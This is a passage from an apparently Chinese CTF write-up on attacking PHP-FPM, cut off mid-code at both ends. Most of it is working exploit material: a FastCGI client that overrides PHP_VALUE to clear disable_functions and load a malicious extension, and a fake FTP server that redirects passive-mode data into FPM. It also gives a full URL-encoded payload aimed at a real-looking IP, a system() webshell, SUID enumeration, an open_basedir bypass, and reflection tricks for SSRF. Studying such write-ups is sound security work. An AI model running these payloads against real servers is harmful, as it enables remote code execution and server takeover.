$this-&gt;buildPacket(self::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        echo(<span class="string">&#x27;data=&#x27;</span>.urlencode($request));</span><br><span class="line">//        fwrite($this-&gt;_sock, $request);</span><br><span class="line">//        do &#123;</span><br><span class="line">//            $resp = $this-&gt;readPacket();</span><br><span class="line">//            <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == self::STDOUT || $resp[<span class="string">&#x27;type&#x27;</span>] == self::STDERR) &#123;</span><br><span class="line">//                $response .= $resp[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; <span class="keyword">while</span> ($resp &amp;&amp; $resp[<span class="string">&#x27;type&#x27;</span>] != self::END_REQUEST);</span><br><span class="line">//        var_dump($resp);</span><br><span class="line">//        <span class="keyword">if</span> (!is_array($resp)) &#123;</span><br><span class="line">//            throw new Exception(<span class="string">&#x27;Bad request&#x27;</span>);</span><br><span class="line">//        &#125;</span><br><span class="line">//        switch (<span class="built_in">ord</span>($resp[<span class="string">&#x27;content&#x27;</span>]&#123;<span class="number">4</span>&#125;)) &#123;</span><br><span class="line">//            <span class="keyword">case</span> self::CANT_MPX_CONN:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::OVERLOADED:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;New request rejected; too busy [OVERLOADED]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::UNKNOWN_ROLE:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;Role value not known [UNKNOWN_ROLE]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::REQUEST_COMPLETE:</span><br><span class="line">//                <span class="keyword">return</span> $response;</span><br><span class="line">//        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// real exploit start here</span><br><span class="line">//<span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">//    die(<span class="string">&quot;Check your input\n&quot;</span>);</span><br><span class="line">//&#125;</span><br><span class="line">//<span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;filepath&#x27;</span>])) &#123;</span><br><span class="line">//    $filepath = __FILE__;</span><br><span class="line">//&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">//    $filepath = $_REQUEST[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line">//&#125;</span><br><span class="line"></span><br><span class="line">$filepath = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;    // 目标主机已知的PHP文件的路径</span><br><span class="line">$req = <span class="string">&#x27;/&#x27;</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;    // 啥也不是, 不用管</span><br><span class="line">$client = new FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">$code = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    // 啥也不是, 不用管</span><br><span class="line">$php_value = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;//加载hpdoger.so文件</span><br><span class="line">$params = array(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; $filepath,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; $req,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; $uri,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; $php_value,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line">// print_r($_REQUEST);</span><br><span class="line">// print_r($params);</span><br><span class="line">//echo <span class="string">&quot;Call: $uri\n\n&quot;</span>;</span><br><span class="line">echo $client-&gt;request($params, $code).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php"> fcgi_jailbreak.php</a> 改编</p><h2 id="ftp-利用"><span id="ftp-利用"> ftp 利用</span></h2><p>由于这里禁用了许多函数和类，像那些普通能构成 SSRF 的函数和类都无法使用，但是 FTP 协议未被禁用。</p><p>我们可以通过在 VPS 上搭建恶意的 FTP 服务器，骗取目标主机将 Payload 重定向到自己的 9001 端口上，从而实现攻击 PHP-FPM 并执行命令。</p><p>FTP（File Transfer Protocol）也支持主动模式和被动模式，这两种模式涉及到数据连接的建立方式。以下是主动模式和被动模式在 FTP 中的工作原理：</p><ol><li><strong>主动模式（Active Mode）：</strong><ul><li>客户端在命令连接上发送 PORT 命令告诉服务器它打开了一个端口（通常是一个随机端口）等待服务器连接。</li><li>服务器在数据连接上连接到客户端指定的地址和端口，进行数据传输。</li><li>主动模式需要客户端打开一个用于数据传输的端口，并告知服务器连接的地址，这可能导致防火墙问题，因为客户端端口的打开和服务器的连接需要穿透防火墙。</li></ul></li><li><strong>被动模式（Passive Mode）：</strong><ul><li>客户端在命令连接上发送 PASV 命令告诉服务器准备好接收数据连接。</li><li>服务器打开一个用于数据传输的端口，并返回这个端口的信息给客户端。</li><li>客户端连接到服务器返回的地址和端口，进行数据传输。</li><li>被动模式相对于主动模式更容易穿越防火墙，因为数据连接是由客户端发起的。</li></ul></li></ol><p>说人话，主动模式客户端开两个端口，一个端口用于连接服务端 21 端口，告诉他服务器另一个端口，然后让服务端来连接.</p><p>被动模式同样一个端口连 21 端口，然后叫服务器别连回来，让服务器开个端口，然后客户端用另一个端口连接这个端口，获取数据.</p><p>倘若我们自己在 vps 搭个 fps 服务端，上传恶意数据，利用被动模式，服务端指定客户端使用 9000 端口 ( <code>fpm服务端口</code> ) 读取我们上传的恶意数据，那么就实现了恶意攻击.</p><p>所以我们可以在我们 vps 上起个恶意的 ftp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7777</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="最终-exp"><span id="最终-exp"> 最终 exp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($_GET[<span class="string">&#x27;file&#x27;</span>],$_GET[<span class="string">&#x27;data&#x27;</span>]);ftp://root@<span class="number">43.143</span><span class="number">.192</span><span class="number">.19</span>:<span class="number">3307</span>/&amp;data=%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%02%3B%<span class="number">00</span>%<span class="number">00</span>%<span class="number">11</span>%0BGATEWAY_INTERFACEFastCGI%2F1<span class="number">.0</span>%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%AFPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+exp.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1<span class="number">.1</span>%0E%02CONTENT_LENGTH49%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%001%<span class="number">00</span>%<span class="number">00</span>%3C%3Fphp+system%<span class="number">28</span>%24_REQUEST%5B%27command%<span class="number">27</span>%5D%<span class="number">29</span>%3B+phpinfo%<span class="number">28</span>%<span class="number">29</span>%3B+%3F%3E%01%05%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>file_put_contents 支持 ftp 协议，让客户端连接到我们的 ftp, 然后开启被动模式，服务端指定客户端用 9001 端口读取数据，从而实现利用.</p><p>拿到 shell 后，SUID 提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);echo file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="题目的-fpm-怎么打"><span id="题目的-fpm-怎么打"> 题目的 fpm 怎么打</span></h1><p>题目不出网，curl 的话高版本也不能用，好在还有个 fsockopen.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fflush</span>()</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概利用就是如上所示.</p><p>由于写循环更为复杂，将 fgets 替换成 fread, 同样也是读取文件的函数.</p><p>优化一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;9000&quot;</span>);</span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$fpm_data</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line"><span class="title function_ invoke__">fflush</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$contents</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>));</span><br></pre></td></tr></table></figure><p>具体就是要实现这么一个逻辑，只不过 fpmdata 涉及不可见字符，选择使用 base64 传递</p><h2 id="arrayobject-的妙用"><span id="arrayobject-的妙用"> ArrayObject 的妙用</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fpmdata</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;your_fpmdata&#x27;</span>);</span><br><span class="line"><span class="variable">$fsockopen</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fsockopen&#x27;</span>);</span><br><span class="line"><span class="variable">$sock</span> = <span class="variable">$fsockopen</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>([<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>]);</span><br><span class="line"><span class="variable">$arg_array</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="string">&#x27;&#x27;</span>]);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">offsetUnset</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$fpmdata</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$arg_array</span>);</span><br><span class="line"><span class="variable">$fwrite</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fwrite&#x27;</span>);</span><br><span class="line"><span class="variable">$fwrite</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fflush</span>(<span class="variable">$sock</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$arg_array_1</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="string">&#x27;&#x27;</span>]);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">offsetUnset</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$length</span>);<span class="comment">//通过外面传进来,出题人exp设置为8</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$arg_array_1</span>);</span><br><span class="line"><span class="variable">$fread</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fread&#x27;</span>);</span><br><span class="line"><span class="variable">$socks_read</span> = <span class="variable">$fread</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$socks_read</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$socks_read</span>);<span class="comment">//将返回数据转成十六进制,防止奇怪的东西</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$socks_read</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>));<span class="comment">#写不写都行,反正重要的部分已经完成了</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于 fsockopen 在题目创建的对象，我们不能够直接传递给函数作为参数，那么我们只能通过 ArrayObject 方法，封装我们的对象.</p><p><code>Arrayobject</code>  可以使用 <code>append</code>  方法添加元素，使用 <code>offsetUnset</code>  移除指定索引内容。同时使用 <code>iterator_to_array</code>  可以将 <code>ArrayObject</code>  对象转成数组.</p><p>这样就可以通过反射调用 <code>fwrite</code> , 使用数组传递参数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CALL base64_decode fpm_data fpm_data</span><br><span class="line"></span><br><span class="line">NEW ReflectionFunction fsockopen fsockopen</span><br><span class="line">ICALL fsockopen invokeArgs fsockopen_args sock<span class="comment">#fsockopen_args = [&#x27;127.0.0.1&#x27;,&quot;9000&quot;]</span></span><br></pre></td></tr></table></figure><p>首先反射调用 fsockopen, 返回一个 sock 对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">CALL base64_decode fpm_data fpm_data</span><br><span class="line"></span><br><span class="line">    NEW ReflectionFunction fsockopen fsockopen</span><br><span class="line">    ICALL fsockopen invokeArgs fsockopen_args sock</span><br><span class="line"></span><br><span class="line">    NEW ArrayObject arg_array arg_array</span><br><span class="line">    ICALL arg_array offsetUnset offset _</span><br><span class="line">    ICALL arg_array append sock _</span><br><span class="line">    ICALL arg_array append fpm_data _</span><br><span class="line">    CALL iterator_to_array arg_array data</span><br><span class="line">    NEW ReflectionFunction fwrite fwrite</span><br><span class="line">    ICALL fwrite invokeArgs data _</span><br><span class="line"></span><br><span class="line">    CALL fflush sock _</span><br><span class="line"></span><br><span class="line">    NEW ArrayObject arg_array_1 arg_array_1</span><br><span class="line">    ICALL arg_array_1 offsetUnset offset _</span><br><span class="line">    ICALL arg_array_1 append sock _</span><br><span class="line">    ICALL arg_array_1 append length _</span><br><span class="line">    CALL iterator_to_array arg_array_1 data</span><br><span class="line">    NEW ReflectionFunction fread fread</span><br><span class="line">    ICALL fread invokeArgs data socks_read</span><br><span class="line"></span><br><span class="line">    CALL bin2hex socks_read socks_read</span><br><span class="line">    CALL var_dump socks_read _</span><br><span class="line"></span><br><span class="line">    CALL file_get_contents file_arg r1</span><br><span class="line">    CALL var_dump r1 _</span><br></pre></td></tr></table></figure><p>其实 fflush 后面的内容都可以不要，这里写出来可能就是为了看清回显，但其实 fwrite 就已经成功进行 SSRF 利用了，</p><h2 id="fpm-生成"><span id="fpm-生成"> fpm 生成</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 